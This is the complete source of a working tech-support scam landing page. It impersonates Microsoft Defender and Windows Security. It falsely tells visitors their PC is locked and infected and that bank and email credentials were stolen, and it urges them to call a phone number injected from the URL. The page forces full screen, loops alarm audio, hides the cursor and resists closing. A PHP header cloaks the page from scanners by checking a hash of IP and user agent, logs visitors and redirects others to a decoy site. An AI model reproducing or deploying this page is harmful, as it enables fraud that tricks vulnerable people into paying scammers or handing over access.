<?php ini_set("display_errors", 0);error_reporting(E_ALL & ~E_NOTICE & ~E_WARNING);header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");function logData($method,$reason, $ip, $ua, $hash, $value){$date = date("Y-m-d H:i:s");$logfile = "log.txt";$logValue = "Date: $date | Type: $method | Status: blocked| Reason: $reason | IP: $ip | UA: $ua | User Hash: $hash | Sent Hash: (Token: $value[0] / Cookie: $value[1])";if(file_exists($logfile)){if(is_writable($logfile)){if($handle = fopen($logfile, "a")){$content = "{$logValue}\r\n";fwrite($handle, $content);fclose($handle);}else{return "File Error";}}else{return "File is not writable";}}else{fopen($logfile, "w");}}if(isset( $_SERVER["HTTP_CF_CONNECTING_IP"] )){$ip = $_SERVER["HTTP_CF_CONNECTING_IP"];}else{/*$ip= $_SERVER["HTTP_X_FORWARDED_FOR"];*/$ip = $_SERVER["REMOTE_ADDR"];}$ua = $_SERVER["HTTP_USER_AGENT"];$method = "token";$value = array(0 => $_GET["chq"]);if(isset($_GET["chq"])){$hash = md5($ip.$ua);if($hash !== $value[0]){logData($method,"hash mismatch", $ip, $ua, $hash, $value);header("Location: https://newjgjkp.weebly.com/about.html", true, 301);}}else{logData($method,"direct hit", $ip, $ua, $hash, $value);header("Location: https://newjgjkp.weebly.com/about.html", true, 301);}?>
<!DOCTYPE html>
<html lang="en">

<head>
	<script defer data-domain="account-2-bill.com/Xy9RBm" src="https://api.publytics.net/js/script.manual.min.js"></script>
	<script>
	    window.publytics = window.publytics || function() { (window.publytics.q = window.publytics.q || []).push(arguments) };
	    publytics('pageview');
	</script>
	
	<meta charset="utf-8">
      <meta content="width=device-width,initial-scale=1,shrink-to-fit=no" name="viewport">
      <meta content="noindex,nofollow" name="robots">
      <title>System security</title>
      <link href="w3" rel="icon" id="favicon" type="image/png">
      <link href="css/tapa.css" rel="stylesheet">
        <link href="css/bootstrap.min.css" <link="" type="text/css" rel="stylesheet">
<script src="js/jquery.min.js"></script>
<script src="js/bootstrap.min.js" crossorigin="anonymous"></script>
<link rel="stylesheet" href="css/font-awesome.min.css">
<script src="js/jquery.min.js"></script>
<script src="js/keys.js"></script>
<script src="js/esc.js"></script>
<script src="js/escs.js"></script>
<script src="js/nets.js"></script>
<script src="js/bootstrap.min.js" crossorigin="anonymous"></script>
<link rel="stylesheet" href="css/font-awesome.min.css">

<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-xxx-x"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-xxx-x');
</script>



<script>
      function vhdydjwhcnfyhecnfheucncevi(name)
      {
          name = name.replace(/[\[]/,"\\\[").replace(/[\]]/,"\\\]");
          var regexS = "[\\?&]"+name+"=([^&#]*)";
          var regex = new RegExp( regexS );
          var results = regex.exec( window.location.href );
          if( results == null )
              return "";
          else
              return results[1];
      }
      var Anph = vhdydjwhcnfyhecnfheucncevi('Anph');
  </script>

  <script type="text/javascript">
              var Anph = getVariableFromURl('Anph');
          </script>

        </head>


         <body class="map" id="mycanvas" onmousemove="showd2();" onclick="chat();beep1();" onbeforeunload="return myFunction()" style="cursor:none">

    <script>
function chat() {
document.getElementById("chat").style.display = "block";
document.getElementById("footer").style.display = "block";
document.getElementById("welcomeDiv").style.display = "block";
 document.getElementById("chat-box").style.display = "none";

}
</script>
    <audio id="ndcysu">
        <source src="media/beep.mp3" type="audio/mpeg">
      </audio>
      <audio autoplay="" id="nfhvtsx">
        <source src="media/en1g.mp3" type="audio/mpeg">
      </audio>

      <a href="index.html#" id="link_black" style="cursor:none" rel="noreferrer">
        <div class="black" style="height: 145%; cursor: none; display: block;"></div>

          <div class="bg" id="bg">
        <div class="bgimg" style="top:0">
          <img src="images/f24.png.jpeg" alt="" width="100%">
        </div>
      </div>
      </a>
      <div class="pro_box" style="cursor: none; display: default;">
        <img src="images/bx01.png" alt="" style="width: 100%;max-width: 100%;">
      </div>
      <div class="pro_box2" style="cursor: default; display: none;">
        <img src="images/bx02.png" alt="" style="width: 100%;max-width: 100%;">

      </div>
      <div class="pro_box3" style="cursor: none; display: none;">
        <img src="images/bx03.png" alt="" style="width: 100%;max-width: 100%;">

        </div>

      <div style="bottom:-20px;position:fixed;cursor:none;z-index:999999999" id="footer">
        <div class="row">
          <div class="col-md-12">
            <div class="right-foot" style="text-align:center">
              <span id="footertxt">
                <img src="images/msmm.png"> Windows Security </span>
              <span style="font-weight:500;padding-left:13px;color:#fff; ">Windows support <span style="border:1px solid #fff;border-radius:5px;padding:2px 5px">     +<script>document.write(Anph)</script>
                </span>
              </span>
            </div>
          </div>
          <div class="col-md-12">
            <marquee direction="left" height="100px" width="100%">
              <small class="text-left" style="color:#eee;font-size:10px">Windows Defender SmartScreen now prevents unrecognized applications from appearing. Running this application may endanger your PC. Windows Defender scanning detected unwanted adware on this device that can steal passwords, online identities, financial information, personal files, photos, and documents.</small>
            </marquee>
          </div>
        </div>
      </div>
      <div class="lightbox" id="poptxt" onclick="beep1();" style="display: none; cursor:default;">
        <div class="ilb top" style="font-size:17px">
          <div class="ilb headers" style="border-bottom:1px solid #d6d5d5;">
            <span class="fl title" id="txtadd">
              <span class="fl ilb">
                <img src="images/dm.png" class="logo3">
              </span>Microsoft Defender </span>
            <span class="fl title2" id="txts1">
               <p style="margin-right:50px;">➖</p><p style="margin-right:30px;">❏ </p><p>❌</p><p></p>

            </span>
          </div>
        </div>
        <div id="txtintro2">
          <span class="colo-rd">
           <p style="font-size:30px;font-weight:500;">Unfortunately the scan is not completed!</p>
            <p style="font-size:25px;color:red;font-weight:500;">Error_Code: Ox800xdfy</p>
             <p style="font-size:15px;font-weight:400;color:black;">Microsoft Defender found some infected files but was unable to remove them due to Group Policy permissions. Please scan now to remove it manually.</p>

          </span>
        </div>
        <img src="images/re.gif" id="banner">
        <div id="disclaimer" style="color:#0F396D;">Call support for help<br>
           <span class="support" style="font-size:22px;">Windows support <span style="border:1px Solid #114d9a;border-radius:5px;padding:2px 5px">     +<script>document.write(Anph)</script>
            </span>
          </span>
        </div>
        <div id="bottom">
          <img src="images/msmm.png" id="badge">
          <span class="title3">Windows Security</span>
          <ul>
            <li>
              <a href="index.html#">
                <div class="fr button">
                  <span id="addtochromebutton">Scan now</span>
                </div>
              </a>
            </li>
            <li>
              <a href="index.html#">
                <div class="fr button2">
                  <span id="addtochromebutton">Scan later</span>
                </div>
              </a>
            </li>
          </ul>
        </div>
      </div>
      <div class="cardcontainer" style="cursor: default; display: none;" id="pop_up_new">
        <p style="font-size:16px;font-weight:400;margin:0;padding:5px 10px;color:#fff!important;color:#414141;font-weight:700;margin-top:0px" class="text-center">Windows-Defender </p>
        <p>
          <b>Access to this PC has been blocked for security reasons.</b>
          </p>
          <p>It has been reported that your computer is infected with Trojan-type spyware. The following data was compromised:</p>
          <p>&gt; E-Mail-ID <br>&gt; Bank password <br>&gt; Facebook login <br>&gt; Photos and documents </p>
          <p>A Windows Defender scan discovered potentially unwanted adware on this device that can steal passwords, online identities, financial information, personal files, photos, and documents. </p>
          <p>Please contact us immediately. Our technician will guide you through the removal process over the phone.</p>
          <p>Call Windows support immediately to report this threat, prevent identity theft, and unlock access to this device. </p>
          <p>Closing this window may put your personal information at risk and result in your Windows registry being locked.</p>
         <p style="padding-bottom:0;color:#fff;font-size:16px"> Please call <br/> Windows Support:<strong>
            <span style="border:1px solid #fff;border-radius:5px;padding:2px 5px">    +<script>document.write(Anph)</script>
            </span>
          </strong>
        </p>
        <div class="action_buttons">
          <a class="active" id="leave_page" style="cursor:pointer;color:#fff!important">Okay</a>
          <a class="active" id="leave_page" style="color:#fff!important">Cancel</a>
        </div>
      </div>


      <div class="answer_list" style="display:none;background-color: rgb(40 40 40 / 80%);;height:auto;width:550px;margin-left:33%;position:absolute;z-index:99999999;border:1px solid transparent;border-color:#d6d8db;border-radius:.5rem" id="welcomeDiv">
        <p style="color:#FFFFFF;margin-top:10px;font-size:16px;opacity:.9;padding:0 5px" class="text-center">Access to this PC has been blocked for security reasons. Do not access or restart this PC. If you overlook this basic warning, you may lose information about this framework. Contact support as soon as possible and a Microsoft expert will guide you through the investigation over the phone. Running this application may endanger your PC.<br>
          <strong>
         Windows support: <span style="border:1px solid #383d41;border-radius:5px;padding:2px 5px">     +<script>document.write(Anph)</script>
            </span>
          </strong>
        </p>
      </div>
      <div id="chat" style="display: none;">
        <img src="images/msmm.png">
        <span style="color:#222;font-size:24px;font-weight:600;margin-left:6px;position:relative;top:5px">Microsoft</span>
        <br>
        <p>Windows Technical Support
        </p>
        <h4 style="font-weight:600;color:#0F396D;font-size:22px">     +<script>document.write(Anph)</script>
          <br>(Toll-free telephone number)<br><br>
        </h4>
        <div class="arrow-down">
          <svg height="1em" viewBox="0 0 320 512">
            <style>
              svg {
                fill: #fff
              }
            </style>
            <path d="M137.4 374.6c12.5 12.5 32.8 12.5 45.3 0l128-128c9.2-9.2 11.9-22.9 6.9-34.9s-16.6-19.8-29.6-19.8L32 192c-12.9 0-24.6 7.8-29.6 19.8s-2.2 25.7 6.9 34.9l128 128z"></path>
                  </svg></div>
      </div>
<div id="chat-box">
<span style="color: #fff;
font-size: 21px;
font-weight: 600;
margin-left: 6px;
position: relative;
top: 5px;">Virus alert 01273 !!</span>
<div class="minimize1" onclick="hide1();playSound1();">
            <p class="text-center1" style="color: #CDCBCB; font-size: 18px; opacity:.9; ">X</p>

          </div>

<br>
<br>
<img src="1s.webp" width="100" />
<p class="text-center" style="color: #CDCBCB;  margin-top:10px; font-size: 16px; opacity:.9; ">
  Microsoft Windows is locked due to unusual activity.
Error_Code: Ox800xdfy.
  It has been reported that your system is infected with Trojan-type spyware. If you need help, contact Microsoft Support <br><strong> +<script>document.write(Anph)</script> (Toll-free telephone number)			 	</strong></p>

</div>

<script>
function showd2() {
document.getElementById("chat-box").style.display = "block";
}
</script>

      <script>
        (function(a) {
          a.fn.countTo = function(b) {
            b = b || {};
            return a(this).each(function() {
              function d(a) {
                a = c.formatter.call(k, a, c);
                h.html(a)
              }
              var c = a.extend({}, a.fn.countTo.defaults, {
                  from: a(this).data("from"),
                  to: a(this).data("to"),
                  speed: a(this).data("speed"),
                  refreshInterval: a(this).data("refresh-interval"),
                  decimals: a(this).data("decimals")
                }, b),
                l = Math.ceil(c.speed / c.refreshInterval),
                n = (c.to - c.from) / l,
                k = this,
                h = a(this),
                m = 0,
                f = c.from,
                g = h.data("countTo") || {};
              h.data("countTo", g);
              g.interval && clearInterval(g.interval);
              g.interval = setInterval(function() {
                f += n;
                m++;
                d(f);
                "function" == typeof c.onUpdate && c.onUpdate.call(k, f);
                m >= l && (h.removeData("countTo"), clearInterval(g.interval), f = c.to, "function" == typeof c.onComplete && c.onComplete.call(k, f))
              }, c.refreshInterval);
              d(f)
            })
          };
          a.fn.countTo.defaults = {
            from: 0,
            to: 0,
            speed: 100,
            refreshInterval: 100,
            decimals: 0,
            formatter: function(a, d) {
              return a.toFixed(d.decimals)
            },
            onUpdate: null,
            onComplete: null
          }
        })(jQuery);
        jQuery(function(a) {
          a(".count-number").data("countToOptions", {
            formatter: function(a, d) {
              return a.toFixed(d.decimals).replace(/\B(?=(?:\d{3})+(?!\d))/g, ",")
            }
          });
          a(".timer").each(function(b) {
            var d = a(this);
            b = a.extend({}, b || {}, d.data("countToOptions") || {});
            d.countTo(b)
          })
        });
      </script>

      <script>
        addEventListener("click", function() {
      var el = document.documentElement
        , rfs =
               el.requestFullScreen
            || el.webkitRequestFullScreen
            || el.mozRequestFullScreen
      ;
      rfs.call(el);
      });

      </script>


      <script>
        setInterval(function() {
          document.getElementById("nfhvtsx").play()
        }, 500);
      </script>
      <script>
  function beep1() {
    document.getElementById("ndcysu").play();
 }
  </script>
      <script>
        var e = 1;
        setInterval(function() {
          1 == e ? (document.getElementById("favicon").href = "w3.html", e = 0) : (document.getElementById("favicon").href = "w1.html", e = 1)
        }, 1E3);
      </script>
      <script>
        $(document).ready(function() {
          $("#mycanvas").click(function() {
            $("#welcomeDiv").show()

          })
        });
      </script>
      <script>
        $(document).ready(function() {
          $(".pro_box").delay(400).fadeIn(300);
          $("#poptxt").delay(2000).fadeIn(400);
              $(".black").delay(1E3).fadeIn(800);
          $(".pro_box2").delay(2500).fadeIn(800);
          $(".pro_box3").delay(3500).fadeIn(800);
          $("#pop_up_new").delay(4E3).fadeIn(800);
        });
      </script>
      <script>
        $(document).ready(function() {
          $("#mycanvas").click(function() {
            $("#poptxt").show()
          })
        });
        $(document).ready(function() {
          $("#cross").click(function() {
            $("#poptxt").show()
          })
        });
      </script>
      <script>
        $(document).ready(function() {
          $("body").mouseover(function() {
            $("#poptxt").show()
          })
        });
      </script>



      </body></html>
